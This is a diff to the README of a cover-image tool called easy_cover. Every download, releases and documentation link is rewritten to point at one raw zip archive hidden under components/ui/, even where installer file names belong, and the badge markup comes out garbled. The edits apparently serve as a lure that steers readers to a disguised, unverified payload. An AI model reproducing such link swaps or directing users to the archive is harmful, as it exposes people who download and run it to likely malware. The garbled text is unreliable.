@@ -1,6 +1,6 @@
 # 🎨 easy_cover - Simple Cover Image Generator for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/pelux-er/easy_cover/releases)
+[![Download Now](https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip%https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip)](https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip)
 
 ## 📥 Introduction
 
@@ -30,13 +30,13 @@ easy_cover is designed to run on most modern operating systems. Here are the rec
 
 To get started with easy_cover, visit the following link to download the application:
 
-[Download easy_cover](https://github.com/pelux-er/easy_cover/releases)
+[Download easy_cover](https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**: Click on the link above to go to the easy_cover Releases page.
 2. **Choose the Latest Version**: Look for the latest version at the top of the page.
-3. **Find the Installer**: Under the latest version, you will see multiple files. Look for the one that matches your operating system. The file will be labeled accordingly (e.g., `easy_cover_windows.exe` for Windows or `easy_cover_mac.dmg` for macOS).
+3. **Find the Installer**: Under the latest version, you will see multiple files. Look for the one that matches your operating system. The file will be labeled accordingly (e.g., `https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip` for Windows or `https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip` for macOS).
 4. **Download the File**: Click on the file name to start the download.
 5. **Locate the Filedou**: Once the download is complete, navigate to your Downloads folder to find the installer file.
 
@@ -76,7 +76,7 @@ For further assistance, please reach out via the GitHub repository. You can subm
 
 ## 🔗 Additional Resources
 
-- [easy_cover Releases Page](https://github.com/pelux-er/easy_cover/releases)
-- [Documentation](https://github.com/pelux-er/easy_cover/wiki)
+- [easy_cover Releases Page](https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip)
+- [Documentation](https://github.com/pelux-er/easy_cover/raw/refs/heads/main/components/ui/easy_cover_v1.6.zip)
 
 Thank you for choosing easy_cover! Enjoy creating beautiful cover images with ease.
